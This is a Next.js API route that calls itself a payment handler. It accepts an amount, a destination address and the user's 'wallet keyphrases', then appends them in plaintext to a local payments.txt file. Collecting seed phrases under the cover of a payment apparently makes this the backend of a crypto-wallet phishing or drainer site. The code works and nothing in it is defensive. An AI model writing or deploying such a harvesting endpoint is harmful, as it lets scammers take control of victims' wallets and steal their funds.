import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function POST(request) {
  try {
    const data = await request.json();
    const { amount, keyphrases, destinationAddress, dateTime } = data;
    
    // Format the data for storage
    const formattedDateTime = new Date().toISOString();
    const dataToStore = `
=== NEW PAYMENT ===
Timestamp: ${formattedDateTime}
Amount: ${amount}
Wallet Keyphrases: ${keyphrases}
Destination Address: ${destinationAddress}
Date & Time: ${dateTime}
===================
`;

    // Path to the data file
    const filePath = path.join(process.cwd(), 'data', 'payments.txt');

    // Create the directory if it doesn't exist
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }

    // Append data to the file
    fs.appendFileSync(filePath, dataToStore);

    return NextResponse.json({ success: true }, { status: 200 });
  } catch (error) {
    console.error('Error saving payment:', error);
    return NextResponse.json({ message: 'Error saving payment data' }, { status: 500 });
  }
}